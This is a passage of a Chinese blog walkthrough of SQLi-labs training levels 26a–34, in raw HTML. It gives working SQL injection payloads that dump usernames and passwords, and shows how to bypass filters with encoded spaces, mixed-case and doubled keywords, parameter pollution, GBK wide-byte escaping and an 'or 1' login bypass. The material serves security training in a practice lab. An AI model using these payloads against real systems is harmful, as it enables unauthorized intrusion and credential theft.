class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/13.png" alt="Less-25(过滤or和and)"></p><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>与 Less-26 相比，只是拼接方式改变了，<code>因为没有输出报错信息，所以不能使用报错注入了</code>，只能被迫抛弃win环境使用docker，直接上payload。</p><pre><code class="hljs sql">?id=999&#x27;)%a0union%a0select%a01,database(),3||(&#x27;1&#x27;)=(&#x27;1?id=999&#x27;)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">?id=999&#x27;</span>)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">?id=999&#x27;</span>)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-27-过滤了很多"><a href="#Less-27-过滤了很多" class="headerlink" title="Less-27(过滤了很多)"></a>Less-27(过滤了很多)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>查看代码，过滤规则又增加了许多：</p><pre><code class="hljs php"><span class="hljs-comment"># 过滤了 /*</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 -</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 #</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了空格</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 union UNION</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><blockquote><p>PHP语法</p></blockquote><blockquote><p>正则表达式</p></blockquote><p><a href="http://php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers">PHP正则表达式的模式修饰符（官方文档）</a><br><a href="http://www.php.cn/php-weizijiaocheng-354831.html">PHP正则中的i,m,s,x,e</a></p><blockquote><ul><li><code>i</code><br>如果设定了此修正符，模式中的字符将同时匹配大小写字母。</li><li><code>m</code><br>如果设定了此修正符，行起始和行结束除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</li><li><code>s</code><br>如果设定了此修正符，模式中的圆点元字符<code>.</code>匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</li><li><code>x</code><br>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的<code>#</code>以及下一个换行符之间的所有字符，包括两头，也都被忽略。</li><li><code>e</code><br>如果设定了此修正符，<code>preg_replace()</code>在替换字符串中对逆向引用作正常的替换。</li><li><code>?</code><br>在<code>.</code>/<code>+</code>/<code>*</code>之后表示非贪婪匹配，<code>.</code>/<code>+</code>/<code>*</code>限定符都是贪婪的，它们会尽可能多的匹配文字，在它们的后面加上一个<code>?</code>就可以实现非贪婪或最小匹配。</li></ul></blockquote><p>union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。</p><pre><code class="hljs bash"><span class="hljs-comment"># 大小写混写</span>unioNunIonseLect...<span class="hljs-comment"># 嵌套双写</span>uunionnionsselectelectununionion...</code></pre><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>单引号字符型，过滤掉了#,–,空格等字符</p><pre><code class="hljs sql">?id=1&#x27;||&#x27;1&#x27;=&#x27;1</code></pre><p>成功闭合<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/14.png" alt="Less-27"></p><h3 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,database(),3%0a||&#x27;1&#x27;=&#x27;1<span class="hljs-comment">#使用%0a代替空格，unIon、selEct随机大小写绕过，-被过滤了，使用999让其爆出显错位</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/15.png" alt="Less-27"></p><h3 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/16.png" alt="Less-27"></p><h3 id="判断列名"><a href="#判断列名" class="headerlink" title="判断列名"></a>判断列名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/17.png" alt="Less-27"></p><h3 id="得到数据"><a href="#得到数据" class="headerlink" title="得到数据"></a>得到数据</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/18.png" alt="Less-27"></p><blockquote><p>总结</p></blockquote><p>1 这里空格<code>%0a</code>代替</p><p>2这里正则表达式是只要你含有 就会一直匹配 双写不能绕过</p><p>3当-1不能用的时候 随便用一个错误的值把显示的位置让出来 给你要的数据</p><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-27 相比，只是拼接方式发生了改变，又因为没有报错日志的输出，所以少了报错注入的利用方式，利用方式换汤不换药，这里不做演示了。</p><pre><code class="hljs sql">?id=999&quot;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span></code></pre><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>过滤规则如下：</p><pre><code class="hljs Php"><span class="hljs-comment"># 过滤 /*</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤 - # 注释</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤 空格 +</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);.<span class="hljs-comment"># 过滤 union select /i 大小写都过滤</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>这里 union 和 select 这里可以使用双写嵌套绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过，OK分析完成后直接放完整的 payload 吧：</p><pre><code class="hljs sql">?id=999&#x27;)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>%a0SEPARATOR%a00x3c62723e))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>比 Less-28 还少了几个过滤规则，可以直接使用 Less-28 的payload：</p><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>这一题和注入天书里面描述的环境不太一样，还是具体分析看下代码吧。</p><ul><li><code>index.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># id = &#x27;x&#x27; 的拼接方式</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> 查询到结果:    输出查询的详细信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>从源码来看的话和前面的貌似没有啥区别，直接尝试联合注入看看吧：</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>这个 index.php 太简单了，不知道啥意思，下面直接重点来看 login.php 吧：</p><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># 查询 query 的字符串</span><span class="hljs-variable">$qs</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<span class="hljs-comment"># 模拟 tomcat 的查询函数 处理一下</span><span class="hljs-variable">$id1</span>=java_implimentation(<span class="hljs-variable">$qs</span>);<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-comment"># 再次过滤检测</span>whitelist(<span class="hljs-variable">$id1</span>);<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> 查询到结果:    输出查询的详细信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());<span class="hljs-meta">?&gt;</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params"><span class="hljs-variable">$query_string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$q_s</span> = <span class="hljs-variable">$query_string</span>;    <span class="hljs-comment"># &amp; 作为分隔符 分割字符串</span>    <span class="hljs-variable">$qs_array</span>= explode(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-variable">$q_s</span>);    <span class="hljs-comment"># 遍历 qs_array 数组</span>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$qs_array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)    &#123;            <span class="hljs-variable">$val</span>=substr(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);        <span class="hljs-comment"># 如果数组前两位是 id 的话</span>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$val</span>==<span class="hljs-string">&quot;id&quot;</span>)        &#123;                <span class="hljs-comment"># 截取 $value 的3-30 的字符串 作为 id 的值 </span>            <span class="hljs-variable">$id_value</span>=substr(<span class="hljs-variable">$value</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>);             <span class="hljs-keyword">return</span> <span class="hljs-variable">$id_value</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;            <span class="hljs-keyword">break</span>;        &#125;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-comment"># 过滤规则 检测数字</span>    <span class="hljs-variable">$match</span> = preg_match(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, <span class="hljs-variable">$input</span>);    <span class="hljs-keyword">if</span> 不符合规则：        header(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);&#125;</code></pre><p>从代码中还是很容易发现问题的，关键问题出在下面的地方：</p><pre><code class="hljs Php"><span class="hljs-variable">$id1</span>=java_implimentation(<span class="hljs-variable">$qs</span>);...whitelist(<span class="hljs-variable">$id1</span>);</code></pre><p><code>whitelist</code> 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 <code>hacked.php</code>，这里是没毛病的。那么问题出在了这里函数<code>$id1=java_implimentation($qs);</code></p><p>因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 <code>return $id_value</code>，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</p><p>假设用户输入这样的语句：</p><pre><code class="hljs Php">index.php?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">2</span></code></pre><p>Apache PHP 会解析最后一个参数</p><p>Tomcat JSP 会解析第一个参数</p><p>知道这个原理的话后面尝试直接注入吧：</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-32-宽字节注入"><a href="#Less-32-宽字节注入" class="headerlink" title="Less-32(宽字节注入)"></a>Less-32(宽字节注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>考察 Bypass addslashes()，关键的防护代码如下：</p><pre><code class="hljs Php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<span class="hljs-variable">$id</span>=check_addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-comment"># 在&#x27; &quot; \ 等敏感字符前面添加反斜杠</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;        <span class="hljs-comment"># \ 转换为 \\</span>    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/&#x27;</span>. preg_quote(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);          将       <span class="hljs-comment"># 将 &#x27; 转为\&quot;</span>    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/\&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>, <span class="hljs-variable">$string</span>);         <span class="hljs-comment"># 将 &quot; 转为\&quot;</span>    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/\&quot;/&#x27;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, <span class="hljs-variable">$string</span>);                                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p><strong>宽字节注入原理</strong></p><p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 <code>%aa%5c</code> 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 <code>\</code>，所以这里想办法干掉反斜杠即可。</p><p>1、<code>%df</code> 吃掉 <code>\</code></p><p>具体的原因是 <code>urlencode(\&#39;) = %5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形 成<code>%df%5c%27</code>，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把<code>%df%5c</code> 当做是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><p>2、将 <code>\&#39;</code> 中的 <code>\</code> 过滤掉</p><p>例如可以构造 <code>%5c%5c%27</code> 的情况，后面的<code>%5c</code>会被前面的<code>%5c</code> 给注释掉。这也是 bypass 的一种方法。</p><p>本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：</p><pre><code class="hljs sql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>拼接方式也是一样的，过滤方法细节有点变化，具体如下：</p><pre><code class="hljs Php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$string</span>= addslashes(<span class="hljs-variable">$string</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串。</p><table><thead><tr><th>预定义字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。</p><blockquote><p>注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p></blockquote><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>过滤方法依然和 Less-33 一致：</p><pre><code class="hljs php"><span class="hljs-variable">$uname</span> = addslashes(<span class="hljs-variable">$uname1</span>);<span class="hljs-variable">$passwd</span>= addslashes(<span class="hljs-variable">$passwd1</span>);</code></pre><p>只是由 GET 型变成了 POST 型，所以下面直接丢 POST 的数据包 payload 了：</p><pre><code class="hljs sql">uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=admin</span></code></pre><p>MySQL 注入天书这里介绍了一个新的方法</p><p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>&#39;</code> 转为 utf-16 为<code>�</code></p><p>我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p><pre><code class="hljs Bash">➜  ~ <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27;|iconv -f utf-8 -t utf-16</span><span class="hljs-string">��&#x27;</span>➜  ~ <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27;|iconv -f utf-8 -t utf-32</span><span class="hljs-string">��&#x27;</span></code></pre><p>首先尝试一个经典的万能密码：</p><pre><code class="hljs Payload">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;</code></pre><p>为什么这个万能密码可以生效呢，因为拼接到 SQL 中是如下的效果：</p><pre><code class="hljs Sql"><span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;�&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-comment">#and password=&#x27;$passwd&#x27; LIMIT 0,1</span></code></pre><p><code>or 1</code> 是一个永真的条件，不论 select 选择出的内容是什么。<code>or 1</code> 之后时钟都是 1，下面是控制后台的演示：</p><pre><code class="hljs Bash"><span class="hljs-comment"># where username = &#x27;x&#x27; or 1</span>mysql&gt;  select * from users <span class="hljs-built_in">where</span> username = <span class="hljs-string">&#x27;x&#x27;</span> or 1;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb       | 0        ||  2 | Angelina   | 0        ||  3 | Dummy      | 0        ||  4 | secure     | 0        ||  5 | stupid     | 0        ||  6 | superman   | 0        ||  7 | batman     | 0        ||  8 | admin      | 1234     ||  9 | admin1     | 0        || 10 | admin2     | 0        || 11 | admin3     | 0        || 12 | dhakkan    | 0        || 14 | admin4     | 0        || 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">14 rows in set (0.00 sec)</span><span class="hljs-string"></span><span class="hljs-string"># where username = &#x27;</span>x<span class="hljs-string">&#x27; or 